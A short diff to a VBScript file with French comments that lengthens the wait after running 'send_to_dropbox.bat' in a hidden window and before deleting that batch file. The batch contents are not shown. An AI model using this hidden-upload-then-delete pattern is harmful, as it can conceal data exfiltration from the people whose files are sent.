@@ -15,7 +15,7 @@ WScript.Sleep 5000
 objShell.Run "send_to_dropbox.bat", 0, True
 
 ' Attendre que le fichier batch ait fini son exécution avant de supprimer
-WScript.Sleep 2000 ' Attendre 2 secondes pour être sûr que le batch est terminé
+WScript.Sleep 10000 ' Attendre 10 secondes pour être sûr que le batch est terminé
 
 ' Supprimer le fichier batch
 Set fso = CreateObject("Scripting.FileSystemObject")
